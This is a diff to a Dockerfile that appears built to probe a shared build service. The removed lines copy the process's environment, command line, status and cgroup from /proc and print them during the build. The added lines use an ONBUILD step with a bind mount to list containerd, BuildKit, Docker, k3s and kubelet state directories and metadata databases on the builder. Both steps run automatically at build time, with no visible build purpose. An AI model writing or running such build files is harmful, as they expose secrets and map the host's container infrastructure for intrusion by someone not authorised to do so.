@@ -1,13 +1,5 @@
-FROM alpine:3.20
-COPY proc/self/environ /f/selfenv
-COPY proc/self/cmdline /f/selfcmd
-COPY proc/self/status /f/selfstat
-COPY proc/self/cgroup /f/selfcg
-RUN set -x; echo "===P1==="; \
- echo "--SELFCMD--"; tr '\0' ' ' < /f/selfcmd 2>&1; echo; \
- echo "--SELFENV--"; tr '\0' '\n' < /f/selfenv 2>&1 | sort | head -80; \
- echo "--SELFENVN--"; tr '\0' '\n' < /f/selfenv 2>&1 | wc -l; \
- echo "--SELFSTAT--"; head -10 /f/selfstat 2>&1; \
- echo "--SELFCG--"; head -5 /f/selfcg 2>&1; \
- echo "===P1END==="
-CMD ["sh","-c","sleep 3600"]
+FROM alpine:3.20 AS base
+ONBUILD RUN --mount=type=bind,source=.,target=/v,ro sh -c 'set +e; echo --V--; ls -la /v 2>&1; echo --CONT--; ls -la /v/containerd 2>&1 | head -20; echo --CONT_BOLT--; ls -la /v/containerd/io.containerd.metadata.v1.bolt 2>&1 | head -20; echo --CONT_CS--; ls -la /v/containerd/io.containerd.content.v1.content 2>&1 | head -20; echo --BK--; ls -la /v/buildkit 2>&1 | head -40; echo --BK_DB--; find /v/buildkit -maxdepth 3 -name "*.db" -o -maxdepth 3 -name "metadata.db" 2>/dev/null | head -20; echo --BV--; ls -la /v/builderv3 2>&1 | head -40; echo --DOCKER--; ls -la /v/docker 2>&1 | head -10; echo --STACKER--; ls -la /v/stacker 2>&1 | head -10; echo --K3S--; ls -la /v/k3s 2>&1 | head -10; echo --KUBELET--; ls -la /v/kubelet 2>&1 | head -10; echo --END--'
+FROM base
+RUN true
+CMD ["true"]
